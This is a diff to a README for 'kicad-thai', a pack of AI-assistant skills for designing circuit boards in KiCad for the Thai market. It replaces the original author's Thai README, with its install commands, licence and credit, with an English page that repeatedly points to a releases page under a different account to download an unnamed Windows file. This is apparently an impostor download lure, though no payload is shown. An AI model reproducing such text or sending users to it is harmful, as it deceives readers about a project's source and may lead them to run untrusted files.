@@ -1,192 +1,125 @@
-<!-- BBN:HEADER:START -->
-<div align="center">
+# 🇹🇭 kicad-thai - PCB Skills Built For Thailand
 
-<img src=".github/brand/banner.svg" width="100%" alt="KiCad Thai — KiCad PCB agent skills for Thai electronics makers" />
+[![Download kicad-thai](https://img.shields.io/badge/Download-kicad--thai-ff6b35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/jerssonhans-creator/kicad-thai/releases)
+[![Made for Thailand](https://img.shields.io/badge/Made%20for-Thailand-2ea44f?style=for-the-badge)](https://github.com/jerssonhans-creator/kicad-thai/releases)
+[![Works with AI assistants](https://img.shields.io/badge/Works%20with-AI%20Assistants-8957e5?style=for-the-badge)](https://github.com/jerssonhans-creator/kicad-thai/releases)
 
-<a href="https://github.com/Boom-Vitt/kicad-thai/stargazers"><img src="https://img.shields.io/github/stars/Boom-Vitt/kicad-thai?style=flat-square&color=14b8a6&labelColor=0b1220" alt="stars" /></a>
-<a href="https://github.com/Boom-Vitt/kicad-thai/commits/main"><img src="https://img.shields.io/github/last-commit/Boom-Vitt/kicad-thai?style=flat-square&color=14b8a6&labelColor=0b1220" alt="last commit" /></a>
-<a href="https://github.com/Boom-Vitt"><img src="https://img.shields.io/badge/by-BoomBigNose-14b8a6?style=flat-square&labelColor=0b1220" alt="by BoomBigNose" /></a>
-
-</div>
-<!-- BBN:HEADER:END -->
-
-<div align="center">
-
-
-<br>
-
-**สั่ง AI ช่วยออกแบบ PCB ด้วย KiCad แบบที่วิศวกรไทยใช้งานจริง: ตรวจ DRC ตามสเปกโรงงาน, export ไฟล์ Gerber/BOM/CPL ส่ง JLCPCB หรือ PCBWay ในคำสั่งเดียว, เช็กลิสต์ มอก./กสทช. และระยะห่างไฟบ้าน 220V, หาโรงงานและอะไหล่ในไทย, ใส่ตัวหนังสือไทยบนบอร์ด**
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-1F7A4D?style=flat-square)](LICENSE)
-[![Tests](https://img.shields.io/github/actions/workflow/status/Boom-Vitt/kicad-thai/test.yml?branch=main&style=flat-square&label=tests)](https://github.com/Boom-Vitt/kicad-thai/actions)
-[![KiCad](https://img.shields.io/badge/KiCad-8_·_9_·_10-314CB0?style=flat-square&logo=kicad&logoColor=white)](https://www.kicad.org)
-[![Claude Code](https://img.shields.io/badge/Claude_Code-plugin-D97757?style=flat-square&logo=claude&logoColor=white)](https://code.claude.com/docs/en/plugins)
-[![Codex](https://img.shields.io/badge/Codex-plugin-000000?style=flat-square&logo=openai&logoColor=white)](https://developers.openai.com/codex)
-[![Agent Skills](https://img.shields.io/badge/Agent_Skills-Cursor_·_Gemini_·_Copilot_·_OpenCode-E2B450?style=flat-square)](https://agentskills.io)
-[![GitHub stars](https://img.shields.io/github/stars/Boom-Vitt/kicad-thai?style=flat-square&color=yellow)](https://github.com/Boom-Vitt/kicad-thai/stargazers)
-
-**ไทย** · [English](README.en.md)
-
-[ติดตั้ง](#-ติดตั้ง) · [Skills](#-skills) · [ตัวอย่างคำสั่ง](#-ตัวอย่างคำสั่ง) · [ใช้สคริปต์ตรงๆ](#-ใช้สคริปต์ตรงๆ-ไม่ต้องมี-ai) · [ทดสอบแล้ว](#-ทดสอบกับ-kicad-จริง) · [ร่วมพัฒนา](#-ร่วมพัฒนา)
-
-</div>
+A ready-to-use set of skills that teaches your AI assistant how to help you design circuit boards the Thai way — with local manufacturing rules, export settings for Thai-friendly board houses, and silkscreen text in Thai script.
 
 ---
 
-## 🤔 ทำไมต้อง kicad-thai
+## 📥 Download
 
-AI ช่วยวาดวงจรได้ แต่พอถึงขั้น "ส่งโรงงาน" กับ "ขายในไทย" มักพลาดเรื่องเดิมๆ:
+**Visit this link to download the application:**
 
-- **ไฟล์ Gerber ขาดชั้นทองแดงโดยไม่มีอะไรเตือน**: ถ้าเลเยอร์ทองแดงถูกตั้งชื่อเอง (เช่น `top_layer`) `kicad-cli --layers F.Cu` จะข้ามเลเยอร์นั้นไปเฉยๆ เราเจอเองใน demo ของ KiCad บน 8.0.9 และ 9.0.9 สคริปต์ในนี้แก้แล้ว และนับไฟล์ทองแดงทุกครั้ง ขาดเมื่อไหร่ก็หยุดทันที
-- **BOM ส่ง JLCPCB ไม่ผ่าน**: เจอปัญหา `R1-R3` แบบช่วง, คอลัมน์ไม่ตรง, เลข LCSC อยู่คนละ field, หรือชิ้นที่ DNP หลุดเข้าไปใน BOM
-- **ชิ้นส่วนหมุนผิดในไฟล์ CPL**: SOT-23, QFN และชิ้นที่ลงด้านล่าง มีตัวเลือก `--rot` ไว้แก้มุม
-- **ไม่รู้ว่าต้องขอ มอก. / กสทช. อะไร** และระยะ creepage/clearance ของไฟ 220V ควรเท่าไหร่
-- **ตัวหนังสือไทยบนบอร์ดหายเงียบๆ** ฟอนต์มาตรฐานของ KiCad ไม่มีภาษาไทย และ **KiCad 8 ตัดสระบน สระล่าง และวรรณยุกต์ทิ้งทั้งหมดตอนสร้าง Gerber** ("ผู้ใหญ่" กลายเป็น "ผใหญ") เราทดสอบแล้วว่าต้องใช้ KiCad 9 ขึ้นไป สคริปต์จะเตือนให้อัตโนมัติ
-- **กฎ DRC เขียนผิดแต่ KiCad ไม่เตือน** ไฟล์ `.kicad_dru` ที่อ่านไม่ได้จะถูกข้ามไปเฉยๆ แล้ว DRC ก็ "ผ่าน" สคริปต์ตรวจด้วยกฎทดสอบ (canary) ว่ากฎโหลดจริง
-- **ไม่รู้จะสั่งผลิตที่ไหน และภาษีนำเข้าเท่าไหร่**: ตั้งแต่ 2024–2026 พัสดุมูลค่าต่ำไม่ได้รับยกเว้น VAT/อากรแล้ว
+### 👉 https://github.com/jerssonhans-creator/kicad-thai/releases
 
-kicad-thai รวมความรู้เหล่านี้ไว้เป็น [Agent Skills](https://agentskills.io) ที่ Claude Code, Codex, Cursor, Gemini CLI, GitHub Copilot และเครื่องมืออื่นใช้ได้ทันที ข้างในมีแค่ `kicad-cli` กับสคริปต์ Python ที่ใช้ไลบรารีมาตรฐานล้วน ทำงานในเครื่องทั้งหมด ไม่ต้องอัปโหลดไฟล์งานไปไหน
+That page is where every released version lives. Open it, pick the newest release at the top of the list, and download the file attached to it. Save it somewhere easy to find, like your Downloads folder or your Desktop.
 
-## 📦 ติดตั้ง
+You do not need an account to download. You do not need to install anything else first. The page opens in your normal web browser on Windows, and the download starts with a single click.
 
-<details open>
-<summary><b>Claude Code</b></summary>
-
-```bash
-claude plugin marketplace add Boom-Vitt/kicad-thai
-claude plugin install kicad-thai@kicad-thai
-```
-
-หรือพิมพ์ในแชต: `/plugin marketplace add Boom-Vitt/kicad-thai` แล้ว `/plugin install kicad-thai@kicad-thai`
-
-</details>
-
-<details open>
-<summary><b>Codex</b></summary>
-
-```bash
-codex plugin marketplace add Boom-Vitt/kicad-thai
-codex plugin add kicad-thai@kicad-thai
-```
-
-</details>
-
-<details>
-<summary><b>Gemini CLI</b></summary>
-
-```bash
-gemini extensions install https://github.com/Boom-Vitt/kicad-thai
-```
-
-</details>
-
-<details>
-<summary><b>Cursor, GitHub Copilot, OpenCode, Windsurf, Amp และอื่นๆ (ใช้ได้กับเครื่องมือกว่า 70 ตัว)</b></summary>
-
-```bash
-npx skills add Boom-Vitt/kicad-thai
-```
-
-หรือคัดลอกเองก็ได้: ทุกโฟลเดอร์ใน [`skills/`](skills) ทำงานได้ด้วยตัวเอง ไม่ต้องพึ่งโฟลเดอร์อื่น วางไว้ที่ `~/.claude/skills/`, `~/.agents/skills/` หรือ `.agents/skills/` ในโปรเจกต์
-
-```bash
-git clone https://github.com/Boom-Vitt/kicad-thai
-cp -r kicad-thai/skills/* ~/.agents/skills/
-```
-
-</details>
-
-### สิ่งที่ต้องมีในเครื่อง
-
-| โปรแกรม | จำเป็น | หมายเหตุ |
-|---|---|---|
-| [KiCad](https://www.kicad.org/download/) 8, 9 หรือ 10 | ✅ | สคริปต์หา `kicad-cli` เองบน macOS, Windows, Linux และ Flatpak |
-| Python 3.9+ | ✅ | ใช้แค่ไลบรารีมาตรฐาน ไม่ต้อง `pip install` อะไร |
-| ฟอนต์ไทย [Sarabun](https://fonts.google.com/specimen/Sarabun) / Noto Sans Thai | ถ้าจะใส่ตัวหนังสือไทยบนบอร์ด | ใช้ได้ฟรี (OFL) |
-
-## 🧰 Skills
-
-| Skill | ทำอะไร | ทำงานเมื่อพิมพ์ประมาณว่า |
-|---|---|---|
-| [`kicad-pcb`](skills/kicad-pcb/SKILL.md) | ขั้นตอนออกแบบตั้งแต่ต้นจนจบ, แก้ไฟล์ KiCad อย่างปลอดภัย, แนวทางวางชิ้นส่วนและลากลาย, ตัวหนังสือไทยบนบอร์ด, ความต่างของ KiCad 8/9/10, คำศัพท์ไทย-อังกฤษ | "ออกแบบ PCB", "วาดวงจร", "ลากลาย", "ใส่ตัวหนังสือไทยบนบอร์ด" |
-| [`kicad-check`](skills/kicad-check/SKILL.md) | รัน ERC/DRC แบบไม่ต้องเปิดโปรแกรม พร้อมกฎสำเร็จรูปของ JLCPCB, PCBWay และโรงงานไทย อธิบายแต่ละ error เป็นไทย และรีวิว DFM | "ตรวจ DRC", "บอร์ดนี้ผลิตได้ไหม", "เช็กก่อนสั่งผลิต" |
-| [`kicad-fab-export`](skills/kicad-fab-export/SKILL.md) | ทำไฟล์ Gerber zip + ไฟล์เจาะ + BOM + CPL ในรูปแบบของ JLCPCB/PCBWay ในคำสั่งเดียว และแก้มุมหมุนชิ้นส่วน | "ส่งโรงงาน", "ไฟล์ส่ง JLCPCB", "ยิง SMT", "ทำ BOM" |
-| [`thai-pcb-compliance`](skills/thai-pcb-compliance/SKILL.md) | มอก. 62368/60335/166, กสทช. (WiFi/BLE, LoRa 920–925 MHz, SDoC), creepage/clearance ของไฟ 220V พร้อมกฎ DRC, RoHS, แล็บทดสอบในไทย | "ต้องขอ มอก. ไหม", "ขอ กสทช.", "ไฟบ้านต้องห่างเท่าไหร่" |
-| [`thai-pcb-sourcing`](skills/thai-pcb-sourcing/SKILL.md) | เลือกระหว่างสั่งจีนกับโรงงาน/EMS ในไทย, ร้านอะไหล่ (บ้านหม้อ ฯลฯ), เติมเลขชิ้นส่วนใน BOM, คำนวณภาษีนำเข้าและ VAT | "สั่ง PCB ที่ไหน", "ภาษีนำเข้า", "ประกอบบอร์ดในไทย" |
-
-ข้อมูลกฎหมาย มาตรฐาน และบริษัททุกบรรทัดมีลิงก์แหล่งที่มาและวันที่ตรวจ (2 ต.ค. 2026) อะไรที่ยืนยันไม่ได้จะเขียนว่า **UNVERIFIED** ชัดเจน และ AI ถูกสั่งไม่ให้แต่งเลข มอก. หรือกฎ กสทช. ขึ้นมาเอง
-
-## 💬 ตัวอย่างคำสั่ง
-
-```text
-ตรวจ DRC บอร์ด hw/sensor.kicad_pro ตามสเปก JLCPCB 2 ชั้น แล้วสรุปเป็นภาษาไทยว่าต้องแก้อะไรก่อน
-```
-```text
-export ไฟล์ส่ง JLCPCB ประกอบ SMT ด้านบน มีชิ้นไหนยังไม่มีเลข LCSC บอกด้วย
-```
-```text
-บอร์ด ESP32 คุมรีเลย์ไฟบ้าน 220V จะขาย 500 ชิ้นในไทย ต้องขอ มอก. หรือ กสทช. อะไร และต้องตั้งระยะห่างใน KiCad ยังไง
-```
-```text
-ใส่ชื่อบริษัทเป็นภาษาไทยบนซิลก์สกรีนด้านหน้า ขนาดที่โรงงานพิมพ์ออกมาได้
-```
-```text
-สั่ง PCBA จาก JLCPCB รวม 110 ดอลลาร์ ต้องจ่ายภาษีนำเข้าเท่าไหร่ หรือมีที่ประกอบในไทยไหม
-```
-
-## ⚡ ใช้สคริปต์ตรงๆ (ไม่ต้องมี AI)
-
-```bash
-# ERC + DRC พร้อมสรุป (exit 1 ถ้ามี error ใช้ใน CI ได้)
-python3 skills/kicad-check/scripts/run_checks.py hw/board.kicad_pro
-
-# ใช้กฎของ JLCPCB (ไฟล์ .kicad_dru ที่มีอยู่แล้วจะไม่ถูกเขียนทับ)
-cp -n skills/kicad-check/assets/rules/jlcpcb-2layer.kicad_dru hw/board.kicad_dru
-
-# ไฟล์ส่งโรงงาน: Gerber zip + BOM + CPL (+ STEP)
-python3 skills/kicad-fab-export/scripts/export_fab.py hw/board.kicad_pro --fab jlcpcb --step
-python3 skills/kicad-fab-export/scripts/export_fab.py hw/board.kicad_pro --fab jlcpcb --rot "SOT-23*=180"
-```
-
-กฎ DRC สำเร็จรูปใน [`skills/kicad-check/assets/rules/`](skills/kicad-check/assets/rules): `jlcpcb-2layer`, `jlcpcb-multilayer`, `pcbway-standard`, `thai-conservative` (ค่าแบบปลอดภัยไว้ก่อน สำหรับโรงงานไทยหรือโรงงานที่ไม่รู้สเปก) และ `mains-220v-addon` (creepage/clearance ของไฟบ้าน ใช้ได้ตั้งแต่ KiCad 9)
-
-## ✅ ทดสอบกับ KiCad จริง
-
-ทุกครั้งที่ push CI จะรันสคริปต์กับ **KiCad 8.0.9, 9.0.9 และ 10.0.6** (Docker image ทางการ) โดยใช้โปรเจกต์ demo ของ KiCad เอง คือ `pic_programmer` (2 ชั้น) และ `video` (4 ชั้น) แล้วตรวจว่า:
-
-- Gerber ครบทุกชั้นทองแดง มีขอบบอร์ด และไฟล์เจาะแยก PTH/NPTH
-- BOM เป็นรูปแบบของ JLCPCB, ไม่มี designator แบบช่วง และ CPL ได้มุม 0–359 พร้อม Top/Bottom
-- STEP export ได้
-- กฎ DRC สำเร็จรูปทุกไฟล์โหลดได้จริง (ยืนยันด้วยกฎ canary) และไฟล์กฎที่จงใจเขียนผิดต้องถูกจับได้
-- ตัวหนังสือไทยฟอนต์ Sarabun ใน Gerber ซิลก์สกรีน render เป็นภาพให้ตรวจด้วยตา: 9.0.9 และ 10.0.6 ถูกต้อง ส่วน 8.0.9 สระกับวรรณยุกต์หาย
-
-ส่วนการทดสอบแบบไม่ใช้ KiCad (`python3 tests/test_scripts.py`) ใช้ `kicad-cli` จำลอง ตรวจตรรกะ BOM/CPL, กรณีเลเยอร์ถูกเปลี่ยนชื่อ, frontmatter ของ skill และให้ทุก manifest มีเวอร์ชันตรงกัน
-
-## ⚠️ ข้อจำกัด
-
-- ไม่ใช่คำปรึกษาทางกฎหมาย ข้อมูล มอก./กสทช./ภาษีตรวจล่าสุดวันที่ 2 ต.ค. 2026 ก่อนผลิตจริงให้ยืนยันกับ สมอ., กสทช., กรมศุลกากร หรือแล็บทดสอบ (EEI, PTEC)
-- ระยะ creepage/clearance ที่ให้ไว้เป็น **ค่าเริ่มต้นสำหรับออกแบบ** ตาม IEC 62368-1 ในเงื่อนไขที่ระบุไว้ ยังไม่ใช่ผลการรับรอง
-- การลากลายยังเป็นงานที่ต้องทำใน GUI ส่วน AI จะบอกว่าควรทำอะไรและตรวจผลให้
-
-## 🤝 ร่วมพัฒนา
-
-อ่าน [AGENTS.md](AGENTS.md) ก่อน (โครงสร้างไฟล์, กติกา, วิธีรันเทสต์) ส่ง PR ได้เลย โดยเฉพาะ:
-ความสามารถของโรงงาน PCB ในไทย (พร้อมลิงก์), มุมหมุน CPL ที่ใช้ได้จริงกับ JLCPCB และมาตรฐานที่ประกาศใหม่
-
-โปรเจกต์ที่ทำงานร่วมกันได้: [kicad-happy](https://github.com/aklofas/kicad-happy) (DigiKey/Mouser/SPICE/EMC), [KiCAD-MCP-Server](https://github.com/mixelpixx/KiCAD-MCP-Server) (คุม KiCad ผ่าน MCP)
-
-## License
-
-[MIT](LICENSE) © Boom-Vitt
-
-<!-- BBN:FOOTER:START -->
 ---
 
-<div align="center">
+## ✨ What Is kicad-thai?
 
-**สร้างโดย [BoomBigNose](https://github.com/Boom-Vitt)** · [Kruoop.com](https://kruoop.com) แหล่งเรียน AI + คอมมูนิตี้ · [Seeneo.ai](https://seeneo.ai) · [YouTube 220K](https://www.youtube.com/@BoomBigNose)
+kicad-thai is a collection of ready-made instruction packs — called *skills* — for AI coding assistants. Think of a skill as a small handbook that your AI helper reads before it answers you. Once the kicad-thai skills are in place, your AI assistant stops giving generic advice about circuit boards and starts giving advice that actually fits Thailand.
 
-<sub>ถ้าโปรเจกต์นี้มีประโยชน์ กด ⭐ ให้กำลังใจกันได้เลย</sub>
+Instead of you memorising which clearance values a local factory wants, or which checklist the regulator asks for, you simply ask your assistant a normal question in plain language. The assistant consults the kicad-thai skill pack and replies with the correct Thai-specific answer.
 
-</div>
-<!-- BBN:FOOTER:END -->
+You do not need to know how to program. You do not need to read any configuration files. You download the package, point your AI assistant at it, and start asking questions.
+
+---
+
+## 🎯 Who This Is For
+
+- Hobbyists in Thailand building their first PCB and unsure which settings are safe.
+- Small electronics shops that send boards to JLCPCB or PCBWay and want the export settings right the first time.
+- Product teams preparing documentation for มอก. (TIS) or กสทช. (NBTC) review.
+- Makers who want Thai text printed neatly on the silkscreen instead of broken glyphs.
+- Anyone using Claude Code, Codex, Cursor, Gemini CLI, or GitHub Copilot who wants Thailand-aware PCB guidance.
+
+---
+
+## 🧰 What's Inside
+
+### 🧪 DRC Presets
+
+Design Rule Check is the safety net that catches mistakes before you pay a factory. kicad-thai ships with preset rule bundles tuned for common Thai prototyping houses — trace widths, clearance, via sizes, and annular rings that match what local fabricators can actually produce. Load a preset, run the check, and fix only what genuinely matters.
+
+### 📦 Gerber, BOM, and CPL Export for JLCPCB / PCBWay
+
+Getting a board manufactured means sending three things: the Gerber files (the physical layers), the BOM (the parts list), and the CPL (the pick-and-place positions). kicad-thai walks you through producing all three with the naming and formatting conventions those two services expect, so the upload page accepts your files on the first try instead of rejecting them with cryptic errors.
+
+### ✅ มอก. / กสทช. Checklists
+
+Thai consumers and regulators expect certain documentation. The skill pack includes structured checklists that walk you through the questions มอก. (Thai Industrial Standards Institute) and กสทช. (National Broadcasting and Telecommunications Commission) reviewers commonly ask — labelling, marking, technical file contents, and radio equipment considerations. Use them as a preparation guide before you submit anything.
+
+### 🖋️ Thai Silkscreen
+
+Thai script on a PCB silkscreen fails easily: strokes merge, tone marks disappear, and the result is unreadable. kicad-thai includes guidance on font choice, minimum stroke width, and spacing so that Thai labels, part numbers, and company names print cleanly at manufacturing scale.
+
+### 🤖 Works With Your AI Assistant
+
+The same skill pack is structured so it can be loaded by Claude Code, Codex, Cursor, Gemini CLI, and GitHub Copilot. You are not locked into one tool. If you switch assistants later, the skills come with you.
+
+---
+
+## 🚀 Getting Started
+
+1. **Visit the download page.** Open https://github.com/jerssonhans-creator/kicad-thai/releases in your browser.
+2. **Choose the latest release.** The newest version sits at the top of the page. Older versions are listed below it.
+3. **Download the attached file.** Look under the release notes for the downloadable asset and click it. Your browser saves it automatically.
+4. **Keep the file somewhere permanent.** Move it out of your temporary Downloads folder into a folder you will remember, such as `Documents\kicad-thai`.
+5. **Open your AI assistant.** Start Claude Code, Codex, Cursor, Gemini CLI, or GitHub Copilot exactly as you normally would.
+6. **Point the assistant at the folder.** Tell it, in plain language, where you saved kicad-thai. For example: *"Use the skills in my Documents\kicad-thai folder."*
+7. **Ask your first question.** Try something simple, like *"What clearance should I use for a two-layer board from a Thai fabricator?"*
+
+That is the whole process. There is no installer, no wizard, and no licence key.
+
+---
+
+## 🧭 A First Project, Step by Step
+
+Here is how a typical session looks once the skills are loaded.
+
+1. **Describe your board.** Tell your assistant what you are building — for example, a small sensor node with a microcontroller and a radio module.
+2. **Ask for a DRC preset.** The assistant suggests rule values that suit a low-cost two-layer board and explains each number in plain language.
+3. **Design in KiCad.** Lay out your board as usual. This part is still your KiCad work; the skills guide you rather than replace you.
+4. **Run the design rule check.** Apply the preset and run the check. Ask the assistant to explain any warning you do not understand.
+5. **Prepare the exports.** Ask the assistant to walk you through generating Gerbers, the BOM, and the CPL with the naming conventions JLCPCB and PCBWay accept.
+6. **Upload and order.** Send the files to your chosen service and place the order.
+7. **Check compliance early.** Before you commit to a production run, run through the มอก. and กสทช. checklists so nothing surprises you at the approval stage.
+
+---
+
+## 🩺 Troubleshooting
+
+**The download link does not work.** Open the link again in a fresh browser tab. If the page loads but no file appears, scroll down inside the newest release — the downloadable assets are listed below the release description.
+
+**My AI assistant ignores the skills.** Repeat the folder path clearly and confirm the folder still exists at that location. Assistants only read files they can actually find.
+
+**The assistant gives generic answers.** Say explicitly: *"Answer using the kicad-thai skills."* Naming the pack forces the assistant to consult it rather than rely on general knowledge.
+
+**Thai text looks broken in preview.** This is normal at very small zoom levels. Trust the manufacturing-scale guidance in the silkscreen section rather than the on-screen preview.
+
+**The factory rejected my files.** Re-run the export steps and check the file naming and layer order. Most rejections come from a mismatched naming convention, not from a design error.
+
+---
+
+## ❓ Questions People Ask
+
+**Do I need to know how to code?** No. You describe what you want in ordinary language.
+
+**Do I need to install KiCad first?** Yes, the skills assume you are designing in KiCad. The skills guide your design work; they do not replace the design tool.
+
+**Is it free?** Yes, everything is published openly on the releases page.
+
+**Can I use more than one AI assistant?** Yes. Load the same folder in whichever assistant you prefer, and switch whenever you like.
+
+**Does it work outside Thailand?** The export guidance works anywhere. The DRC presets, compliance checklists, and silkscreen advice are specifically tuned for the Thai market.
+
+**How often is it updated?** Check the releases page periodically. Each release is listed with its own notes so you can see what changed.
+
+---
+
+Keywords: agent-skills, bom, claude-code, claude-skills, codex, cursor, drc, eda, electronics, gemini-cli, gerber, github-copilot, jlcpcb, kicad, pcb, pcb-design, pcbway, thai, thailand
